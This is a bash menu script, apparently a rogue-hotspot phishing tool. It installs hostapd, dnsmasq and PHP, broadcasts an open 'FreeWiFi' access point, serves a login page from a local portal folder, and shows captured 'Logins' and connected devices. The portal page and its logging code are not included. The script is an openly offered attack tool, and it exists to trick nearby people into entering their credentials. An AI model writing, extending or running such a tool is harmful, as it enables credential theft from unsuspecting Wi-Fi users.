#!/bin/bash

IFACE="wlp4s0"
SSID="FreeWiFi"
PORTAL_DIR="portal"
LOG_FILE="logs/log.txt"

HOSTAPD_CONF="/tmp/hostapd.conf"
DNSMASQ_CONF="/tmp/dnsmasq.conf"

# ---------------------------
# Setup
# ---------------------------
setup() {
    echo "[+] Setting up..."
    mkdir -p "$PORTAL_DIR" logs
    touch "$LOG_FILE"
    chmod 666 "$LOG_FILE"

    sudo apt update
    sudo apt install hostapd dnsmasq php-cli -y

    echo "[+] Setup done!"
}

# ---------------------------
# Create configs
# ---------------------------
create_configs() {

cat > $HOSTAPD_CONF <<EOF
interface=$IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
EOF

cat > $DNSMASQ_CONF <<EOF
interface=$IFACE
dhcp-range=192.168.4.2,192.168.4.50,255.255.255.0,12h
EOF

}

# ---------------------------
# Start hotspot
# ---------------------------
start_hotspot() {
    echo "[+] Starting hotspot..."

    sudo systemctl stop NetworkManager
    sudo systemctl stop wpa_supplicant

    sudo ip link set $IFACE down
    sudo ip addr flush dev $IFACE
    sudo ip addr add 192.168.4.1/24 dev $IFACE
    sudo ip link set $IFACE up

    create_configs

    sudo hostapd $HOSTAPD_CONF -B
    sudo dnsmasq -C $DNSMASQ_CONF

    echo "[+] Hotspot started: $SSID"
}

# ---------------------------
# Stop hotspot
# ---------------------------
stop_hotspot() {
    echo "[+] Stopping hotspot..."

    sudo pkill hostapd
    sudo pkill dnsmasq

    sudo systemctl start NetworkManager

    echo "[+] Stopped."
}

# ---------------------------
# Start portal server
# ---------------------------
start_server() {
    echo "[+] Starting portal..."
    cd "$PORTAL_DIR" || exit
    php -S 0.0.0.0:80
}

# ---------------------------
# Show devices
# ---------------------------
show_devices() {
    echo "[+] Connected devices:"
    cat /var/lib/misc/dnsmasq.leases 2>/dev/null
}

# ---------------------------
# Logs
# ---------------------------
view_logs() {
    echo "---- Logins ----"
    cat "$LOG_FILE"
}

live_logs() {
    tail -f "$LOG_FILE"
}

# ---------------------------
# Edit page
# ---------------------------
edit_page() {
    nano "$PORTAL_DIR/index.html"
}

# ---------------------------
# Menu
# ---------------------------
while true; do
    echo ""
    echo "====== WiFi Portal Tool ======"
    echo "1) Setup"
    echo "2) Start Hotspot"
    echo "3) Stop Hotspot"
    echo "4) Start Login Page"
    echo "5) Show Devices"
    echo "6) View Logs"
    echo "7) Live Logs"
    echo "8) Edit Page"
    echo "9) Exit"
    echo "=============================="
    read -p "Select: " choice

    case $choice in
        1) setup ;;
        2) start_hotspot ;;
        3) stop_hotspot ;;
        4) start_server ;;
        5) show_devices ;;
        6) view_logs ;;
        7) live_logs ;;
        8) edit_page ;;
        9) exit ;;
        *) echo "Invalid" ;;
    esac
done
